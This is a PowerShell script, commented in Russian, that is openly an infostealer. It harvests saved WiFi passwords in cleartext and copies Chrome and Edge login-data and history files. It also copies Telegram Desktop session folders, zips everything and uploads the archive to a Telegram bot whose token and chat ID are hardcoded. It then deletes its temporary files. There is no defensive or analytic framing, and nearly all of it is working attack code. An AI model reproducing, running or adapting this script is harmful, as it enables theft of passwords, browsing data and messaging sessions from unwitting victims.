<#
.SYNOPSIS
    Ultimate Data Collector - Автономная версия
.DESCRIPTION
    Собирает: WiFi пароли, данные браузеров, историю, файлы мессенджеров
#>

# Конфигурация Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = $Text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
    } catch { Write-Output "[!] Telegram error: $_" }
}

function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { Write-Output "[!] File send error: $_" }
}

# 1. Сбор WiFi паролей (улучшенный метод)
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.txt"
    $result = @("=== WiFi Passwords ===")
    
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $_.Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                $profileInfo = netsh wlan show profile name="$profile" key=clear
                $password = ($profileInfo | Select-String "Key Content").Line.Split(":")[1].Trim()
                
                $result += "SSID: $profile"
                $result += "Password: $password"
                $result += "----------------"
            } catch { $result += "Error with $profile`: $_" }
        }
    } catch { $result += "WiFi module error: $_" }
    
    $result -join "`n" | Out-File -FilePath $outputFile
    return $outputFile
}

# 2. Сбор данных браузеров (без SQLite)
function Get-BrowserData {
    $outputFile = "$TEMP_DIR\browser_data.txt"
    $result = @("=== Browser Data ===")
    
    # Chrome
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            $result += "Chrome: Found login data (manual extraction required)"
            Copy-Item $chromePath "$TEMP_DIR\chrome_logindata" -Force
        }
    } catch { $result += "Chrome error: $_" }
    
    # Edge
    try {
        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        if (Test-Path $edgePath) {
            $result += "Edge: Found login data (manual extraction required)"
            Copy-Item $edgePath "$TEMP_DIR\edge_logindata" -Force
        }
    } catch { $result += "Edge error: $_" }
    
    $result -join "`n" | Out-File -FilePath $outputFile
    return $outputFile
}

# 3. Сбор истории браузеров
function Get-BrowserHistory {
    $outputFile = "$TEMP_DIR\browser_history.txt"
    $result = @("=== Browser History ===")
    
    # Chrome History
    try {
        $chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
        if (Test-Path $chromeHistoryPath) {
            $result += "Chrome: History file copied"
            Copy-Item $chromeHistoryPath "$TEMP_DIR\chrome_history" -Force
        }
    } catch { $result += "Chrome history error: $_" }
    
    # Edge History
    try {
        $edgeHistoryPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
        if (Test-Path $edgeHistoryPath) {
            $result += "Edge: History file copied"
            Copy-Item $edgeHistoryPath "$TEMP_DIR\edge_history" -Force
        }
    } catch { $result += "Edge history error: $_" }
    
    $result -join "`n" | Out-File -FilePath $outputFile
    return $outputFile
}

# 4. Сбор файлов Telegram
function Get-TelegramData {
    $result = @()
    $paths = @(
        "$env:APPDATA\Telegram Desktop\tdata",
        "$env:USERPROFILE\Documents\Telegram Desktop\tdata"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $dest = "$TEMP_DIR\Telegram_$([System.IO.Path]::GetFileName($path))"
            try {
                Copy-Item -Path $path -Destination $dest -Recurse -Force
                $result += $dest
            } catch { Write-Output "Telegram copy error: $_" }
        }
    }
    
    return $result
}

# Основной сбор
try {
    # Собираем данные
    $wifiFile = Get-WiFiPasswords
    $browserFile = Get-BrowserData
    $historyFile = Get-BrowserHistory
    $telegramFiles = Get-TelegramData
    
    # Архивируем все
    $zipFile = "$env:TEMP\Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    $filesToZip = @($wifiFile, $browserFile, $historyFile) + $telegramFiles | Where-Object { $_ -ne $null }
    Compress-Archive -Path $filesToZip -DestinationPath $zipFile -Force
    
    # Отправляем архив
    Send-FileToTelegram -FilePath $zipFile
    
    # Краткий отчет
    $report = @(
        "=== Data Collection Complete ===",
        "WiFi Passwords: $(if (Test-Path $wifiFile) {'✔'} else {'✖'})",
        "Browser Data: $(if (Test-Path $browserFile) {'✔'} else {'✖'})",
        "Browser History: $(if (Test-Path $historyFile) {'✔'} else {'✖'})",
        "Telegram Data: $(if ($telegramFiles.Count -gt 0) {'✔'} else {'✖'})",
        "Archive: $(Split-Path $zipFile -Leaf)"
    ) -join "`n"
    
    Send-ToTelegram -Text $report
}
catch {
    Send-ToTelegram -Text "[CRITICAL ERROR] $_"
}
finally {
    # Очистка
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}
